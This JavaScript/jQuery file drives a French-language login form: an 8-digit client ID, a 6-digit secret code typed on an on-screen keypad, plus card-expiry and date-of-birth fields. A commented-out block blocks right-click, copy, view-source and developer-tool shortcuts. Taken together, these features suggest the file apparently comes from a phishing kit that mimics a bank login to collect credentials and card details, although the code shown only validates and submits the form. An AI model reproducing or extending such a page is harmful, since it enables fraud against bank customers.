var isShift = false;
var seperator = "/";
var dash = '-';

function cc_date(input, keyCode) {
    if (keyCode == 16) {
        isShift = true;
    }
    //Allow only Numeric Keys.
    if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
        if( keyCode == 8 ) {
            input.value = '';
        } else if (input.value.length == 2) {
            input.value += seperator;
        }
        return true;
    }
    else {
        return false;
    }
};

function date_of_birth(input, keyCode) {
    if (keyCode == 16) {
        isShift = true;
    }
    //Allow only Numeric Keys.
    if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
        if( keyCode == 8 ) {
            input.value = '';
        } else if (input.value.length == 2 || input.value.length == 5) {
            input.value += seperator;
        }
        return true;
    }
    else {
        return false;
    }
};

jQuery(function($){

    /*document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });*/
    
    $('form ul.numbers li a').click(function(){
        var cur_number = $(this).data('number');
        if( cur_number == 'zz' )
            return false;
        if( cur_number == '-1' )
            var cur_number = "0";
        var old_val = $('#password').val();
        var zz = old_val + cur_number;
        if( $('#password').val().length == 6 )
            return false;
        $('#password').val(zz);
        var a = $('ul.password-field').children(".empty");
        if( a.length > 0 ) {
            $(a[0]).removeClass('empty');
            $(a[0]).addClass('notempty');
        }
    });

    $('.reset-password').click(function(){
        $('#password').val('');
        $('ul.password-field').children().removeClass("notempty");
        $('ul.password-field').children().addClass("empty");
    });

    $('.input-reset').click(function(){
        $(this).siblings('label').find('input').val('');
        $(this).hide();
    });

    $('.login-form button').click(function(){
        var code_client = $('#code_client').val();
        var length = code_client.length;
        var password = $('#password').val();
        if( length == 8 && $.isNumeric(code_client) && password == ''  ) {
            $('.login-form .zzz').show();
            $('.login-form .error-message').text('').hide();
        } else if( length != 8 || !$.isNumeric(code_client) && password == '' ) {
            $('.login-form .error-message').text('Votre identifiant est incorrect.').show();
        } else if( length == 8 && $.isNumeric(code_client) && password.length != 6 ) {
            $('.login-form .error-message').text('Le code secret saisi est incorrect. Merci de bien vouloir ressaisir votre code secret composÃ© de 6 chiffres.').show();
        } else {
            $('.login-form .error-message').text('').hide();
            $('.login-form').submit();
        }
    });

    $('#code_client').keyup(function(){
        var code_client = $('#code_client').val();
        var length = code_client.length;
        if( length > 0 ) {
            $('#input-reset').show();
        } else {
            $('#input-reset').hide();
        }
        if( length == 8 && $.isNumeric(code_client) ) {
            $('.login-form .input-reset').hide();
            $('.login-form .check').show();
        } else {
            $('.login-form .zzz').hide();
            $('.login-form .input-reset').show();
            $('.login-form .check').hide();
            $('#password').val('');
            $('ul.password-field').children().removeClass("notempty");
            $('ul.password-field').children().addClass("empty");
        }
    });

    $('.input').focus(function(){
        $(this).parent().find(".label-txt").addClass('label-active');
    });

    $('.input').each(function(){
        if($(this).val().length > 0) {
            $(this).parent().find(".label-txt").addClass('label-active');
        }
    });

    $(".input").focusout(function(){
        if ($(this).val() == '') {
            $(this).parent().find(".label-txt").removeClass('label-active');
        };
    });

    var input_date = $("#birth_date");
    input_date.keydown(function(e){
        date_of_birth(this, e.keyCode);
    });

})